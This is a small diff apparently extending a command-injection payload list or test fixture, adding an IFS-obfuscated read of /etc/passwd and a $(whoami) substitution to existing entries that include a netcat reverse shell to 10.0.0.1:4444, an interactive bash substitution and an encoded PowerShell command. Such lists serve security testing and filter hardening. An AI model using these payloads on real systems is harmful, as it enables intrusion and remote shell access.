@@ -6,3 +6,5 @@ $(bash -i)
 nc -e /bin/sh 10.0.0.1 4444
 cmd.exe /c whoami
 powershell -e aQBlAHgA
+cat${IFS}/etc/passwd
+x=$(whoami)
